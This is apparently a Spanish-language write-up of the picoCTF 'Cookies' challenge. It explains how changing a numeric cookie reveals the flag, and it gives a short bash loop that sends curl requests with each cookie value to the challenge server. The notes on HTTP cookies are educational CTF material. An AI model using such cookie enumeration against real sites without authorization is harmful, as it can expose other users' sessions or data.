### Cookies
## Objetivo
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:21485/](http://mercury.picoctf.net:21485/)
## Datos de acceso al nivel
## Solución
La cookie tiene el vlor de -1. "snickerdoodle" es el texto predeterminado en la barra de búsqueda. Lo enviamos "snickerdoodle" al sitio web y al verificar la cookie  /check y tendrá el valor de 0.

Buscando el rango encontré que hay 29 cookies posibles (0-28). En uno está la bandera.

Escribí un script para iterar a través de las posibles cookies e identificar cuál tenía la bandera. 

```bash
    #!/bin/bash
    for i in {0..28}
    do
        curl --cookie "name=$i" "http://mercury.picoctf.net:54219/check"
    done
```

Para ejecutar el script anterior, ejecute lo siguiente en la CLI de Linux: `chmod +x cookie.sh && ./cookie.sh | grep -oE "picoCTF{.*}" > flag.txt`

La bandera se guardará en un archivo de texto llamado flag.txt.
## Notas adicionales
Las cookies HTTP son pares clave-valor que se utilizan para identificar su dispositivo mientras navega por un sitio web. Una cookie es exclusiva de la sesión de un usuario.
EditThisCookie --> Es una extensión del navegador que le permite ver y modificar las propiedades de las cookies.
## Referencias
[Cookie properties - EditThisCookie](https://www.editthiscookie.com/blog/2014/03/cookie-properties/)
